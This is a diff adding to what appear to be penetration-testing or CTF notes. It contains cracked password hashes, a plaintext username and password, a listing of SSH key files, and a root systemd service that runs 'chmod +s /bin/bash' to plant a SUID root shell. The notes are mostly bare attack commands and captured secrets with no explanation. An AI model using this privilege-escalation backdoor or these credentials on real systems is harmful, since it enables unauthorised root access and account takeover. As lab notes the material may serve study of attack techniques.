@@ -100,3 +100,42 @@ john
 | -------------------------------- | --- | --------- |
 | 1254737c076cf867dc53d60a0364f38e | md5 | jsmith123 |
 stephen 1234
+
+
+
+```
+cat << EOF > /etc/systemd/system/zeno-monitoring.service
+[Unit]
+Description=Zeno monitoring
+
+[Service]
+Type=oneshot 
+User=root
+ExecStart=/bin/bash -c "chmod +s /bin/bash"
+
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+
+```
+
+
+-rw-------. 1 edward edward 1 Sep 21  2021 /home/edward/.ssh/authorized_keys
+
+-rw-r--r--. 1 root root 162 Jun  8  2021 /etc/ssh/ssh_host_ecdsa_key.pub
+-rw-r--r--. 1 root root 82 Jun  8  2021 /etc/ssh/ssh_host_ed25519_key.pub
+-rw-r--r--. 1 root root 382 Jun  8  2021 /etc/ssh/ssh_host_rsa_key.pub
+-rw-r--r--. 1 root root 1665 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/key1.pub
+-rw-r--r--. 1 root root 3181 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/key2.pub
+-rw-r--r--. 1 root root 908 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/passphrase.pub
+-rw-r--r--. 1 root root 1454 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/revoked.pub
+-rw-r--r--. 1 root root 4046 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/signonly.pub
+
+```
+
+
+```
+,username=zeno,password=FrobjoodAdkoonceanJa
+```
